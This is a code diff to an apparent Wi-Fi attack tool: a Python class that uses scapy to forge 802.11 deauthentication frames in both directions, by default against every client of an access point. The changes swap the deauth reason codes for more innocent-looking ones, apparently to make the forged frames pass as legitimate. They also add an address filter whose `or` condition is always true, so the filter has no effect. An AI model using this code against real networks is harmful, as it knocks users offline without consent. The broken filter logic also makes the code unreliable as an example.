@@ -89,7 +89,8 @@ class IW:
 				if ap[2] in addrs:
 					for addr in addrs:
 						if addr != ap[2]:
-							ap[3].append(addr)
+							if addr != "00:00:00:00:00:00" or addr != "ff:ff:ff:ff:ff:ff":
+								ap[3].append(addr)
 			return
 
 		if p_80211.type != 0 and p_80211.subtype != 8:
@@ -223,9 +224,9 @@ class IW:
 
 	def deauth(self, ssid, mac, client="FF:FF:FF:FF:FF:FF"):
 		# AP -> Client
-		p1 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=client, addr2 = mac,addr3 = mac)/sc.Dot11Deauth(reason=1)
+		p1 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=client, addr2 = mac,addr3 = mac)/sc.Dot11Deauth(reason=5) # reason = "AP cannot handle this many stations"
 		# Client -> AP
-		p2 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=mac, addr2 = client,addr3 = mac)/sc.Dot11Deauth(reason=1)
+		p2 = sc.RadioTap()/sc.Dot11(type=0, subtype=12, addr1=mac, addr2 = client,addr3 = mac)/sc.Dot11Deauth(reason=8) # reason = "Client is leaving"
 
 		# socket (for performance)
 		s = sc.conf.L2socket(iface=self.netifmon)
